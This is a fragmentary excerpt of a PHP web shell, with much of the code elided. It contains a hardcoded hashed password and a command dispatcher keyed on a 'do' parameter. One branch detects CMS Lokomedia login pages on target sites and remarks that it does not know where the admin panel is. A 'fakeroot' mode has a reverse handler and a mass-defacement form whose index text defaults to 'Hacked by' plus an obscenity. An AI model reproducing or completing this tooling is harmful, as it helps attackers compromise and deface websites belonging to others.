...
$password = "4221e86df1faaa8bf447c4f7e5e50ff9"; 
	...
	if(isset($_GET['do'])) {
							...
							if($target == '') {
								...
								if($target2 == '') {
									...
									elseif(preg_match("/CMS Lokomedia|Lokomedia/", $cek_login4)) {
										...
										$url_target2 = "Login => <a href='$target2' target='_blank'><u>$target2</u></a> [ <font color=red>idk where the admin panel :p</font> ]<br>";
									}
								}
							} else {
		...
		elseif($_GET['do'] == 'fakeroot') {
			...
			if($_POST['reverse']) {
				...
				print "</textarea><br>
				<font style='text-decoration: underline;'>Index File:</font><br>
				<textarea name='script' style='width: 450px; height: 200px;'>Hacked by Fucker</textarea><br>
